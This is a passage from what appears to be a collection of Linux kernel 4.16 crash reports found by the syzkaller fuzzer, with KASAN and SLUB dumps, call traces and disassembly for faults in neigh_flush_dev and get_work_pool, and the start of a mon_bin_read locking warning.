 .J...j..,K..4j..\nPadding 00000000bc619d2c: 4c 4c ff ff 7c 6a 00 00 6c 4c ff ff 94 6a 00 00  LL..|j..lL...j..\nPadding 00000000701b8583: 7c 4c ff ff ac 6a 00 00 8c 4c ff ff c4 6a 00 00  |L...j...L...j..\nPadding 00000000df9b3224: dc 4c ff ff ec 6a 00 00 1c 4d ff ff 0c 6b 00 00  .L...j...M...k..\nPadding 0000000098785f2a: bc 4d ff ff 34 6b 00 00 cc 4d ff ff 4c 6b 00 00  .M..4k...M..Lk..\nPadding 00000000f5631e10: 5c 4e ff ff 74 6b 00 00 6c 4e ff ff 8c 6b 00 00  \\N..tk..lN...k..\nPadding 00000000fc83404a: 7c 4e ff ff a4 6b 00 00 8c 4e ff ff bc 6b 00 00  |N...k...N...k..\nPadding 00000000cc48aadc: 9c 4e ff ff d4 6b 00 00 3c 4f ff ff fc 6b 00 00  .N...k..<O...k..\nPadding 00000000847141b5: 4c 4f ff ff 14 6c 00 00 ec 4f ff ff 3c 6c 00 00  LO...l...O..<l..\nPadding 000000008f8c53f2: fc 4f ff ff 54 6c 00 00 9c 50 ff ff 7c 6c 00 00  .O..Tl...P..|l..\nPadding 00000000cf546a42: ac 50 ff ff 94 6c 00 00 0c 51 ff ff e4 6c 00 00  .P...l...Q...l..\nPadding 00000000d4eca897: 2c 52 ff ff 0c 6d 00 00 7c 53 ff ff 74 6d 00 00  ,R...m..|S..tm..\nPadding 00000000a02c95f5: 5c 54 ff ff 9c 6d 00 00 dc 54 ff ff dc 6d 00 00  \\T...m...T...m..\nPadding 000000002d310f31: 8c 55 ff ff fc 6d 00 00 fc 55 ff ff 34 6e 00 00  .U...m...U..4n..\nPadding 00000000fafd1dc9: 1c 57 ff ff 84 6e 00 00 9c 5c ff ff ec 6e 00 00  .W...n...\\...n..\nPadding 00000000bcb78224: 1c 66 ff ff 3c 6f 00 00 6c 66 ff ff 5c 6f 00 00  .f..<o..lf..\\o..\nPadding 000000008bb546c8: 7c 66 ff ff 74 6f 00 00 4c 67 ff ff 9c 6f 00 00  |f..to..Lg...o..\nPadding 000000007443e4a8: 5c 68 ff ff fc 6f 00 00 7c 68 ff ff 14 70 00 00  \\h...o..|h...p..\nPadding 000000009f2c9fb7: 0c 69 ff ff 3c 70 00 00 5c 6a ff ff 9c 70 00 00  .i..<p..\\j...p..\nPadding 0000000012fab070: cc 6a ff ff b4 70 00 00 dc 6a ff ff cc 70 00 00  .j...p...j...p..\nPadding 00000000c3c1ff6f: ec 6a ff ff e4 70 00 00 9c 6b ff ff 0c 71 00 00  .j...p...k...q..\nPadding 000000009e70e7bc: 8c 6c ff ff 3c 71 00 00 2c 6d ff ff 64 71 00 00  .l..<q..,m..dq..\nPadding 00000000fa87c884: 4c 6e ff ff b4 71 00 00 fc 6e ff ff ec 71 00 00  Ln...q...n...q..\nPadding 0000000099e55e6b: ec 6f ff ff 24 72 00 00 4c 70 ff ff 4c 72 00 00  .o..$r..Lp..Lr..\nPadding 000000000ada5079: 0c 71 ff ff 74 72 00 00 5c 71 ff ff 9c 72 00 00  .q..tr..\\q...r..\nPadding 00000000eb83fdc1: dc 73 ff ff cc 72 00 00 5c 74 ff ff ec 72 00 00  .s...r..\\t...r..\nPadding 000000002c60ed6f: dc 75 ff ff 24 73 00 00 dc 77 ff ff 54 73 00 00  .u..$s...w..Ts..\nPadding 00000000e1c20d9f: ec 78 ff ff 7c 73 00 00 1c 7b ff ff ac 73 00 00  .x..|s...{...s..\nPadding 0000000057727abe: 3c 7c ff ff f4 73 00 00 2c 7e ff ff 44 74 00 00  <|...s..,~..Dt..\nPadding 00000000843e5549: fc 7e ff ff 94 74 00 00 dc 7f ff ff bc 74 00 00  .~...t.......t..\nPadding 0000000099ac4b9b: 9c 80 ff ff e4 74 00 00 dc 84 ff ff 14 75 00 00  .....t.......u..\nPadding 00000000aed5f95a: 4c 86 ff ff 64 75 00 00 1c 88 ff ff b4 75 00 00  L...du.......u..\nPadding 00000000cca14eaa: 14 00 00 00 00 00 00 00 01 7a 52 00 01 78 10 01  .........zR..x..\nPadding 0000000013d0cab9: 1b 0c 07 08 90 01 00 00 24 00 00 00 1c 00 00 00  ........$.......\nPadding 000000000fadbec6: 20 c0 fc ff c0 02 00 00 00 0e 10 46 0e 18 4a 0f   ..........F..J.\nPadding 000000009562ce88: 0b 77 08 80 00 3f 1a 3b 2a 33 24 22 00 00 00 00  .w...?.;*3$\"....\nPadding 00000000eb0a5ed7: 4c 00 00 00 44 00 00 00 18 c9 fc ff 35 02 00 00  L...D.......5...\nPadding 00000000def647b9: 00 42 0e 10 8f 02 45 0e 18 8e 03 45 0e 20 8d 04  .B....E....E. ..\nPadding 0000000053c6234e: 42 0e 28 8c 05 44 0e 30 86 06 44 0e 38 83 07 47  B.(..D.0..D.8..G\nPadding 0000000077e484a6: 0e 80 01 03 6e 01 0a 0e 38 44 0e 30 41 0e 28 42  ....n...8D.0A.(B\nPadding 000000005ff2f3cf: 0e 20 42 0e 18 42 0e 10 42 0e 08 48 0b 00 00 00  . B..B..B..H....\nPadding 0000000096f4153f: 4c 00 00 00 94 00 00 00 08 cb fc ff 92 02 00 00  L...............\nPadding 00000000d2d9949e: 00 42 0e 10 8f 02 45 0e 18 8e 03 42 0e 20 8d 04  .B....E....B. ..\nPadding 000000009d5f7ebd: 42 0e 28 8c 05 44 0e 30 86 06 41 0e 38 83 07 46  B.(..D.0..A.8..F\nPadding 00000000e8a1ffd1: 0e a0 01 02 63 0a 0e 38 43 0e 30 41 0e 28 42 0e  ....c..8C.0A.(B.\nPadding 000000005631cf1d: 20 42 0e 18 42 0e 10 42 0e 08 41 0b 00 00 00 00   B..B..B..A.....\nPadding 00000000706ffa28: 34 00 00 00 e4 00 00 00 58 cd fc ff 77 00 00 00  4.......X...w...\nPadding 0000000050c8bdc3: 00 41 0e 10 86 02 44 0e 18 83 03 44 0e 20 02 57  .A....D....D. .W\nPadding 00000000a32c239e: 0a 0e 18 41 0e 10 41 0e 08 4e 0b 44 0e 18 41 0e  ...A..A..N.D..A.\nPadding 0000000015759079: 10 41 0e 08 00 00 00 00 14 00 00 00 1c 01 00 00  .A..............\nPadding 0000000003cacb1b: a0 cd fc ff 0f 00 00 00 00 00 00 00 00 00 00 00  ................\nPadding 000000008606175c: 1c 00 00 00 34 01 00 00 98 cd fc ff 82 00 00 00  ....4...........\nPadding 000000003c098351: 00 44 0e 10 83 02 02 6f 0a 0e 08 4d 0b 41 0e 08  .D.....o...M.A..\nPadding 00000000764b030a: 34 00 00 00 54 01 00 00 08 ce fc ff ca 00 00 00  4...T...........\nPadding 0000000082e4ce0a: 00 42 0e 10 8c 02 46 0e 18 86 03 41 0e 20 83 04  .B....F....A. ..\nPadding 00000000fb72479f: 02 96 0a 0e 18 44 0e 10 42 0e 08 4b 0b 53 0e 18  .....D..B..K.S..\nPadding 00000000e21bacdb: 44 0e 10 42 0e 08 00 00 34 00 00 00 8c 01 00 00  D..B....4.......\nPadding 00000000d0aef8fc: a0 ce fc ff 4f 00 00 00 00 41 0e 10 86 02 44 0e  ....O....A....D.\nPadding 000000009cf8ba3d: 18 83 03 44 0e 20 6f 0a 0e 18 44 0e 10 41 0e 08  ...D. o...D..A..\nPadding 00000000b9b64409: 4b 0b 44 0e 18 41 0e 10 41 0e 08 00 00 00 00 00  K.D..A..A.......\nPadding 000000009b867efb: 1c 00 00 00 c4 01 00 00 b8 ce fc ff 23 00 00 00  ............#...\nPadding 000000000be125de: 00 44 0e 10 83 02 5e 0e 08 00 00 00 00 00 00 00  .D....^.........\nPadding 00000000782485b6: 1c 00 00 00 e4 01 00 00 c8 ce fc ff 38 00 00 00  ............8...\nPadding 00000000e2a0117f: 00 41 0e 10 83 02 4a 0e 20 6b 0e 10 41 0e 08 00  .A....J. k..A...\nPadding 0000000000968500: 24 00 00 00 04 02 00 00 e8 ce fc ff 77 00 00 00  $...........w...\nPadding 0000000015dc235c: 00 44 0e 10 83 02 68 0a 0e 08 44 0b 7b 0a 0e 08  .D....h...D.{...\nPadding 00000000ce2d98dc: 45 0b 46 0e 08 00 00 00 24 00 00 00 2c 02 00 00  E.F.....$...,...\nFIX kmalloc-1024: Restoring 0x000000007f0b2d60-0x00000000dd7f0dc3=0x5a\n\nBUG kmalloc-1024 (Tainted: G    B           ): Redzone overwritten\n-----------------------------------------------------------------------------\n\nINFO: 0x000000003c0d68da-0x000000006627d529. First byte 0x74 instead of 0xbb\nINFO: Allocated in 0x6c6365642064656c age=4288204118 cpu=1634755954 pid=1650419058\n\t0x736e6f6974617261\n\t0x206c61636f6c2027\n\t0x2e6261746d7973\nINFO: Freed in 0x79706f635f746163 age=4294825300 cpu=1633902457 pid=1633840236\n\t0x6361626c6c61635f\n\t0x6b\nINFO: Slab 0x0000000063ffd7ff objects=23 used=23 fp=0x          (null) flags=0x100000000008100\nINFO: Object 0x0000000004edb325 @offset=15144 fp=0x00000000ecd1348d\n\nRedzone 000000003c0d68da: 74 79 70 65 2c 20 62 75                          type, bu\nObject 0000000004edb325: 74 20 69 74 20 77 61 73 20 61 6c 72 65 61 64 79  t it was already\nObject 00000000335eaff7: 20 64 65 63 6c 61 72 65 64 20 61 73 20 61 6e 20   declared as an \nObject 00000000fa3716c7: 61 74 74 72 69 62 75 74 65 2e 00 00 00 00 00 00  attribute.......\nObject 000000003a0538c8: 62 61 73 65 5f 72 6f 6c 65 20 21 3d 20 28 28 76  base_role != ((v\nObject 00000000d6826906: 6f 69 64 20 2a 29 30 29 20 26 26 20 62 61 73 65  oid *)0) && base\nObject 00000000540c71c0: 5f 72 6f 6c 65 2d 3e 66 6c 61 76 6f 72 20 3d 3d  _role->flavor ==\nObject 0000000094207091: 20 31 00 00 00 00 00 00 6e 65 77 5f 74 79 70 65   1......new_type\nObject 0000000041e18a90: 20 21 3d 20 28 28 76 6f 69 64 20 2a 29 30 29 20   != ((void *)0) \nObject 00000000a53fc715: 26 26 20 6e 65 77 5f 74 79 70 65 2d 3e 66 6c 61  && new_type->fla\nObject 000000004007c881: 76 6f 72 20 3d 3d 20 31 00 00 00 00 00 00 00 00  vor == 1........\nObject 00000000c52a713f: 43 6f 75 6c 64 20 6e 6f 74 20 66 69 6e 64 20 73  Could not find s\nObject 000000008bb09284: 63 6f 70 65 20 69 6e 66 6f 72 6d 61 74 69 6f 6e  cope information\nObject 000000009ccd8411: 20 66 6f 72 20 63 6c 61 73 73 20 25 73 00 00 00   for class %s...\nObject 00000000f070a0bd: 54 61 72 67 65 74 20 6f 66 20 6c 69 6e 6b 20 77  Target of link w\nObject 0000000051096b90: 61 73 20 6e 6f 74 20 61 20 62 61 73 65 20 70 6f  as not a base po\nObject 00000000c678acb4: 6c 69 63 79 2e 00 00 00 54 72 69 65 64 20 74 6f  licy....Tried to\nObject 00000000ea86d450: 20 6c 69 6e 6b 20 69 6e 20 61 20 70 6f 6c 69 63   link in a polic\nObject 00000000dfb1963b: 79 20 74 68 61 74 20 77 61 73 20 6e 6f 74 20 61  y that was not a\nObject 000000004319a8ca: 20 6d 6f 64 75 6c 65 2e 00 00 00 00 00 00 00 00   module.........\nObject 0000000099034a51: 54 72 69 65 64 20 74 6f 20 6c 69 6e 6b 20 69 6e  Tried to link in\nObject 000000009169cdf9: 20 61 20 6e 6f 6e 2d 4d 4c 53 20 6d 6f 64 75 6c   a non-MLS modul\nObject 000000001b02449a: 65 20 77 69 74 68 20 61 6e 20 4d 4c 53 20 62 61  e with an MLS ba\nObject 000000003efa1ff3: 73 65 2e 00 00 00 00 00 54 72 69 65 64 20 74 6f  se......Tried to\nObject 000000005e541e59: 20 6c 69 6e 6b 20 69 6e 20 61 6e 20 4d 4c 53 20   link in an MLS \nObject 00000000fbb78863: 6d 6f 64 75 6c 65 20 77 69 74 68 20 61 20 6e 6f  module with a no\nObject 000000008f5b63ad: 6e 2d 4d 4c 53 20 62 61 73 65 2e 00 00 00 00 00  n-MLS base......\nObject 00000000be018c8f: 45 72 72 6f 72 20 77 68 69 6c 65 20 6e 6f 72 6d  Error while norm\nObject 00000000e88c5bf6: 61 6c 69 7a 69 6e 67 20 63 6f 6e 64 69 74 69 6f  alizing conditio\nObject 00000000d5490613: 6e 61 6c 73 20 77 69 74 68 69 6e 20 74 68 65 20  nals within the \nObject 00000000c03832ba: 6d 6f 64 75 6c 65 20 25 73 2e 00 00 00 00 00 00  module %s.......\nObject 000000007ac42efb: 45 72 72 6f 72 20 77 68 69 6c 65 20 6e 6f 72 6d  Error while norm\nObject 00000000cf6d9ddb: 61 6c 69 7a 69 6e 67 20 63 6f 6e 64 69 74 69 6f  alizing conditio\nObject 00000000483b542f: 6e 61 6c 73 20 77 69 74 68 69 6e 20 74 68 65 20  nals within the \nObject 000000009a2837d6: 62 61 73 65 20 6d 6f 64 75 6c 65 2e 00 00 00 00  base module.....\nObject 00000000e8da9592: 6d 6f 64 75 6c 65 2d 3e 6d 61 70 5b 35 5d 5b 63  module->map[5][c\nObject 0000000057d7664e: 75 72 5f 65 78 70 72 2d 3e 62 6f 6f 6c 20 2d 20  ur_expr->bool - \nObject 00000000f0accf04: 31 5d 20 21 3d 20 30 00 44 65 74 65 72 6d 69 6e  1] != 0.Determin\nObject 0000000091805bc8: 69 6e 67 20 77 68 69 63 68 20 61 76 72 75 6c 65  ing which avrule\nObject 00000000c4c00959: 73 20 74 6f 20 65 6e 61 62 6c 65 2e 00 00 00 00  s to enable.....\nObject 000000004415bfe0: 25 73 27 73 20 67 6c 6f 62 61 6c 20 72 65 71 75  %s's global requ\nObject 0000000046e460da: 69 72 65 6d 65 6e 74 73 20 77 65 72 65 20 6e 6f  irements were no\nObject 00000000cdbe3b78: 74 20 6d 65 74 3a 20 63 6c 61 73 73 20 25 73 2c  t met: class %s,\nObject 00000000523806bf: 20 70 65 72 6d 69 73 73 69 6f 6e 20 25 73 00 00   permission %s..\nObject 00000000d16a59a5: 25 73 27 73 20 67 6c 6f 62 61 6c 20 72 65 71 75  %s's global requ\nObject 00000000917c2eca: 69 72 65 6d 65 6e 74 73 20 77 65 72 65 20 6e 6f  irements were no\nObject 00000000b194ee1c: 74 20 6d 65 74 3a 20 25 73 20 25 73 00 00 00 00  t met: %s %s....\nObject 000000000ad8b34b: 25 73 5b 25 64 5d 27 73 20 6f 70 74 69 6f 6e 61  %s[%d]'s optiona\nObject 000000005b652c29: 6c 20 72 65 71 75 69 72 65 6d 65 6e 74 73 20 77  l requirements w\nObject 00000000b3b7db56: 65 72 65 20 6e 6f 74 20 6d 65 74 3a 20 63 6c 61  ere not met: cla\nObject 0000000050afe408: 73 73 20 25 73 2c 20 70 65 72 6d 69 73 73 69 6f  ss %s, permissio\nObject 00000000af8777f9: 6e 20 25 73 00 00 00 00 25 73 5b 25 64 5d 27 73  n %s....%s[%d]'s\nObject 00000000ed2e0c4f: 20 67 6c 6f 62 61 6c 20 72 65 71 75 69 72 65 6d   global requirem\nObject 00000000a38109b6: 65 6e 74 73 20 77 65 72 65 20 6e 6f 74 20 6d 65  ents were not me\nObject 00000000727933b7: 74 3a 20 63 6c 61 73 73 20 25 73 2c 20 70 65 72  t: class %s, per\nObject 000000006cd62167: 6d 69 73 73 69 6f 6e 20 25 73 00 00 00 00 00 00  mission %s......\nObject 00000000d4d51859: 25 73 5b 25 64 5d 27 73 20 6f 70 74 69 6f 6e 61  %s[%d]'s optiona\nObject 00000000202541f8: 6c 20 72 65 71 75 69 72 65 6d 65 6e 74 73 20 77  l requirements w\nObject 0000000072844a33: 65 72 65 20 6e 6f 74 20 6d 65 74 3a 20 25 73 20  ere not met: %s \nObject 0000000024231452: 25 73 00 00 00 00 00 00 25 73 5b 25 64 5d 27 73  %s......%s[%d]'s\nObject 000000003163801f: 20 67 6c 6f 62 61 6c 20 72 65 71 75 69 72 65 6d   global requirem\nObject 00000000cb0c9a59: 65 6e 74 73 20 77 65 72 65 20 6e 6f 74 20 6d 65  ents were not me\nObject 000000004f71b8df: 74 3a 20 25 73 20 25 73 00 00 00 00 00 00 00 00  t: %s %s........\nObject 0000000025b8ddc6: 50 6f 70 75 6c 61 74 69 6e 67 20 72 6f 6c 65 2d  Populating role-\nObject 0000000083a48d57: 61 74 74 72 69 62 75 74 65 20 72 65 6c 61 74 69  attribute relati\nRedzone 00000000ab86f028: 6f 6e 73 68 69 70 20 66                          onship f\nPadding 000000006b830c57: 70 79 5f 63 61 6c 6c 62                          py_callb\nCPU: 0 PID: 1483 Comm: kworker/u7:2 Tainted: G    B            4.16.0-rc7+ #27\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nWorkqueue: writeback wb_workfn (flush-8:0)\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n check_bytes_and_report.cold.80+0x40/0x6f mm/slub.c:770\nFIX kmalloc-1024: Restoring 0x000000003c0d68da-0x000000006627d529=0xbb\n\nFIX kmalloc-1024: Marking all objects used\nkasan: CONFIG_KASAN_INLINE enabled\nkasan: GPF could be caused by NULL-ptr deref or user memory access\ngeneral protection fault: 0000 [#1] SMP KASAN PTI\nDumping ftrace buffer:\n   (ftrace buffer empty)\nModules linked in:\nCPU: 0 PID: 2843 Comm: syz-executor7 Tainted: G    B            4.16.0-rc7+ #27\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:neigh_flush_dev+0x1d1/0x7f0 net/core/neighbour.c:246\nRSP: 0018:ffff88007a5062f0 EFLAGS: 00010202\nRAX: 0cae640e4decc45e RBX: 657320726f662073 RCX: ffffffff835801c3\nRDX: 0000000000000000 RSI: 0000000000000050 RDI: 657320726f6622f3\nRBP: 1ffff1000f4a0c6e R08: 1ffff1000f4a0c2e R09: 0000000000000000\nR10: 0000000098471c2f R11: 0000000000000000 R12: ffff88002d5d4c5d\nR13: 0000000000000001 R14: ffff880023126b88 R15: dffffc0000000000\nFS:  000000000282e940(0000) GS:ffff88002e000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00007fe70c00d068 CR3: 000000002a822000 CR4: 00000000000006f0\nDR0: 0000000020000100 DR1: 0000000020000100 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600\nCall Trace:\n neigh_ifdown+0x47/0x260 net/core/neighbour.c:293\n rt6_disable_ip+0x55b/0x740 net/ipv6/route.c:3809\n addrconf_ifdown+0x13e/0x13a0 net/ipv6/addrconf.c:3596\n addrconf_notify+0x946/0x2130 net/ipv6/addrconf.c:3520\n notifier_call_chain+0x123/0x2b0 kernel/notifier.c:93\n call_netdevice_notifiers net/core/dev.c:1725 [inline]\n dev_close_many+0x3a9/0x770 net/core/dev.c:1504\n rollback_registered_many+0x4af/0xe00 net/core/dev.c:7383\n rollback_registered+0x1b3/0x3c0 net/core/dev.c:7448\n unregister_netdevice_queue+0x2d3/0x520 net/core/dev.c:8462\n unregister_netdevice include/linux/netdevice.h:2473 [inline]\n __tun_detach+0xd0f/0xf80 drivers/net/tun.c:736\n tun_detach drivers/net/tun.c:746 [inline]\n tun_chr_close+0x40/0x50 drivers/net/tun.c:3168\n __fput+0x2f1/0x7c0 fs/file_table.c:209\n task_work_run+0x173/0x240 kernel/task_work.c:113\n exit_task_work include/linux/task_work.h:22 [inline]\n do_exit+0x979/0x17b0 kernel/exit.c:865\nCode: 49 8b 1e 48 85 db 0f 84 bf 03 00 00 e8 49 58 49 fe 48 83 3c 24 00 74 46 e8 3d 58 49 fe 48 8d bb 80 02 00 00 48 89 f8 48 c1 e8 03 <42> 80 3c 38 00 0f 85 d5 05 00 00 48 8b 04 24 48 39 83 80 02 00 \nRIP: neigh_flush_dev+0x1d1/0x7f0 net/core/neighbour.c:246 RSP: ffff88007a5062f0\n---[ end trace 666d51d5bb7c675c ]---\n```\n\n### Code\n\n```c\n   0:   49 8b 1e                mov    rbx,QWORD PTR [r14]\n   3:   48 85 db                test   rbx,rbx\n   6:   0f 84 bf 03 00 00       je     0x3cb\n   c:   e8 49 58 49 fe          call   0xfffffffffe49585a\n  11:   48 83 3c 24 00          cmp    QWORD PTR [rsp],0x0\n  16:   74 46                   je     0x5e\n  18:   e8 3d 58 49 fe          call   0xfffffffffe49585a\n  1d:   48 8d bb 80 02 00 00    lea    rdi,[rbx+0x280]\n  24:   48 89 f8                mov    rax,rdi\n  27:   48 c1 e8 03             shr    rax,0x3\n  2b:  *42 80 3c 38 00          cmp    BYTE PTR [rax+r15*1],0x0\n  30:   0f 85 d5 05 00 00       jne    0x60b\n  36:   48 8b 04 24             mov    rax,QWORD PTR [rsp]\n  3a:   48                      rex.W\n  3b:   39                      .byte 0x39\n  3c:   83                      .byte 0x83\n  3d:   80 02 00                add    BYTE PTR [rdx],0x0\n```\n\n**End**\n\n\n## get_work_pool - general page fault\n\nFound on LK v4.16.0-rc7. leaded to null-dereference.\n\n### Call Trace (Dump)\n\n```c\n[  981.132280] general protection fault: 0000 [#1] SMP KASAN PTI\n[  981.132834] Dumping ftrace buffer:\n[  981.133121]    (ftrace buffer empty)\n[  981.133424] Modules linked in:\n[  981.133795] CPU: 1 PID: 1024 Comm: kworker/u6:1 Not tainted 4.16.0-rc7+ #27\n[  981.134510] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  981.135333] Workqueue: netns cleanup_net\n[  981.135829] RIP: 0010:get_work_pool+0x148/0x1e0\n[  981.136353] RSP: 0018:ffff88002929ef18 EFLAGS: 00010002\n[  981.136927] RAX: dffffc0000000000 RBX: 0000000fffffff00 RCX: ffffffffb8197397\n[  981.137552] RDX: 00000001ffffffe0 RSI: ffffffffbb8f4ca0 RDI: 0000000000000046\n[  981.138139] RBP: 1ffff10005253de7 R08: ffff88002929f070 R09: ffff880029338920\n[  981.138854] R10: 0000000000000001 R11: 0000000000000000 R12: 1ffff10005253de3\n[  981.139432] R13: 1ffff10005253e30 R14: dffffc0000000000 R15: fffffbfff77aec6b\n[  981.140115] FS:  0000000000000000(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000\n[  981.140811] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  981.141372] CR2: 000000c4232e7000 CR3: 00000000274c4000 CR4: 00000000000006e0\n[  981.141992] DR0: 0000000020000100 DR1: 0000000020000100 DR2: 0000000000000000\n[  981.142674] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600\n[  981.143293] Call Trace:\n[  981.143584]  ? trace_raw_output_workqueue_execute_start+0x100/0x100\n[  981.144486]  ? deref_stack_reg+0x110/0x110\n[  981.145095]  flush_work+0xcb/0x830\n[  981.145585]  ? insert_work+0x3c0/0x3c0\n[  981.146110]  ? print_usage_bug+0x140/0x140\n[  981.146621]  ? ret_from_fork+0x3a/0x50\n[  981.147064]  ? save_stack+0x89/0xb0\n[  981.147458]  ? __kasan_slab_free+0x12c/0x170\n[  981.148005]  ? kfree+0xf3/0x310\n[  981.148454]  ? xfrm_net_exit+0x11/0x30\n[  981.148955]  ? ops_exit_list.isra.6+0xa1/0x140\n[  981.149514]  ? cleanup_net+0x622/0xbc0\n[  981.150070]  ? process_one_work+0xafd/0x1970\n[  981.150659]  ? worker_thread+0x21a/0x1830\n[  981.151191]  ? kthread+0x32b/0x3f0\n[  981.151616]  ? ret_from_fork+0x3a/0x50\n[  981.152077]  ? __delete_object+0x133/0x1b0\n[  981.152625]  ? lock_acquire+0x4a0/0x4a0\n[  981.153221]  xfrm_policy_fini+0xae/0x4d0\n[  981.153755]  ? xfrm_policy_flush+0x470/0x470\n[  981.154335]  ? _raw_write_unlock_irqrestore+0x46/0x60\n[  981.154988]  ? mark_held_locks+0xa8/0xf0\n[  981.155435]  ? quarantine_put+0xc1/0x160\n[  981.155934]  ? __kasan_slab_free+0x141/0x170\n[  981.156546]  ? xfrm_net_exit+0x11/0x30\n[  981.157027]  ? xfrm_policy_fini+0x4d0/0x4d0\n[  981.157563]  xfrm_net_exit+0x19/0x30\n[  981.158013]  ops_exit_list.isra.6+0xa1/0x140\n[  981.158639]  cleanup_net+0x622/0xbc0\n[  981.159131]  ? peernet2id_alloc+0x330/0x330\n[  981.159639]  ? __lock_acquire+0x840/0x4670\n[  981.160164]  ? save_trace+0x300/0x300\n[  981.160660]  ? find_held_lock+0x32/0x1b0\n[  981.161172]  ? save_trace+0x300/0x300\n[  981.161646]  ? lock_acquire+0x1a5/0x4a0\n[  981.162132]  ? process_one_work+0xa3f/0x1970\n[  981.162644]  ? finish_task_switch+0x182/0x740\n[  981.163184]  ? lock_downgrade+0x6e0/0x6e0\n[  981.163783]  ? do_raw_spin_trylock+0x190/0x190\n[  981.164377]  ? __lock_is_held+0xad/0x140\n[  981.164866]  process_one_work+0xafd/0x1970\n[  981.165377]  ? _raw_spin_unlock_irq+0x24/0x40\n[  981.165955]  ? drain_workqueue+0x560/0x560\n[  981.166670]  ? lock_repin_lock+0x410/0x410\n[  981.167349]  ? __schedule+0x75c/0x1ea0\n[  981.167810]  ? __sched_text_start+0x8/0x8\n[  981.168348]  ? select_task_rq_fair+0x1177/0x35d0\n[  981.169101]  ? save_trace+0x300/0x300\n[  981.169600]  ? lock_acquire+0x4a0/0x4a0\n[  981.170140]  ? __read_once_size_nocheck.constprop.8+0x10/0x10\n[  981.170813]  ? lock_downgrade+0x6e0/0x6e0\n[  981.171376]  ? find_held_lock+0x32/0x1b0\n[  981.171851]  ? lock_acquire+0x1a5/0x4a0\n[  981.172370]  ? worker_thread+0x467/0x1830\n[  981.172853]  ? lock_downgrade+0x6e0/0x6e0\n[  981.173387]  ? do_raw_spin_trylock+0x190/0x190\n[  981.173925]  worker_thread+0x21a/0x1830\n[  981.174691]  ? do_raw_spin_trylock+0x190/0x190\n[  981.175253]  ? process_one_work+0x1970/0x1970\n[  981.175789]  ? find_held_lock+0x32/0x1b0\n[  981.176345]  ? _raw_spin_unlock_irq+0x24/0x40\n[  981.176899]  ? _raw_spin_unlock_irq+0x24/0x40\n[  981.177480]  ? finish_task_switch+0x1c2/0x740\n[  981.178058]  ? finish_task_switch+0x182/0x740\n[  981.178608]  ? set_load_weight+0x270/0x270\n[  981.179158]  ? lock_repin_lock+0x410/0x410\n[  981.179794]  ? __schedule+0x75c/0x1ea0\n[  981.180430]  ? __sched_text_start+0x8/0x8\n[  981.181023]  ? kmem_cache_alloc_trace+0x116/0x2b0\n[  981.181688]  ? kthread+0x98/0x3f0\n[  981.182180]  ? save_trace+0x300/0x300\n[  981.182703]  ? create_object+0x799/0xb40\n[  981.183289]  ? schedule+0xf0/0x3a0\n[  981.183883]  ? lock_acquire+0x4a0/0x4a0\n[  981.184539]  ? __schedule+0x1ea0/0x1ea0\n[  981.185213]  ? wait_woken+0x260/0x260\n[  981.185838]  ? do_raw_spin_trylock+0x190/0x190\n[  981.186489]  ? __lockdep_init_map+0xdf/0x4d0\n[  981.187031]  ? __init_waitqueue_head+0x89/0x140\n[  981.187610]  ? _raw_spin_unlock_irqrestore+0x46/0x60\n[  981.188213]  ? process_one_work+0x1970/0x1970\n[  981.188729]  ? process_one_work+0x1970/0x1970\n[  981.189283]  kthread+0x32b/0x3f0\n[  981.189714]  ? kthread_create_worker_on_cpu+0xe0/0xe0\n[  981.190430]  ret_from_fork+0x3a/0x50\n[  981.190997] Code: 28 00 00 00 0f 85 8c 00 00 00 48 83 c4 60 5b 5d 41 5c c3 30 db e8 69 e6 27 00 48 89 da 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <80> 3c 02 00 75 6a 48 8b 1b eb a6 e8 48 e6 27 00 e8 a3 82 14 00 \n[  981.193585] RIP: get_work_pool+0x148/0x1e0 RSP: ffff88002929ef18\n[  981.194350] ---[ end trace f68a6ddbb826daeb ]---\n[  981.194897] Kernel panic - not syncing: Fatal exception\n[  981.195715] Dumping ftrace buffer:\n[  981.196118]    (ftrace buffer empty)\n[  981.196618] Kernel Offset: 0x37000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[  981.197790] Rebooting in 86400 seconds..\n```\n\n### Code\n\n```c\n   0:   28 00                   sub    BYTE PTR [rax],al\n   2:   00 00                   add    BYTE PTR [rax],al\n   4:   0f 85 8c 00 00 00       jne    0x96\n   a:   48 83 c4 60             add    rsp,0x60\n   e:   5b                      pop    rbx\n   f:   5d                      pop    rbp\n  10:   41 5c                   pop    r12\n  12:   c3                      ret    \n  13:   30 db                   xor    bl,bl\n  15:   e8 69 e6 27 00          call   0x27e683\n  1a:   48 89 da                mov    rdx,rbx\n  1d:   48 b8 00 00 00 00 00    movabs rax,0xdffffc0000000000\n  24:   fc ff df \n  27:   48 c1 ea 03             shr    rdx,0x3\n  2b:  *80 3c 02 00             cmp    BYTE PTR [rdx+rax*1],0x0\n  2f:   75 6a                   jne    0x9b\n  31:   48 8b 1b                mov    rbx,QWORD PTR [rbx]\n  34:   eb a6                   jmp    0xffffffffffffffdc\n  36:   e8 48 e6 27 00          call   0x27e683\n  3b:   e8 a3 82 14 00          call   0x1482e3\n```\n\n**End**\n\n\n## mon_bin_read - possible circular locking dependency detected\n\nGot from syzkaller & Found in LK v4.16.0. Maybe, this post is similar with the past post (mon_bin_vma stuff).\n\n### Call Trace (Dump)\n\n```c\nWARNING: possible circular locking dependency detected\n4.16.0+ #28 Not tainted\n------------------------------------------------------\nsyz-executor3/12637 is trying to acquire lock:\n00000000548b0ec6 (&mm->mmap_sem){++++}, at: __might_fault+0xd4/0x1b0 mm/memory.c:4571\n\nbut task is already holding lock:\n00000000edee7e51 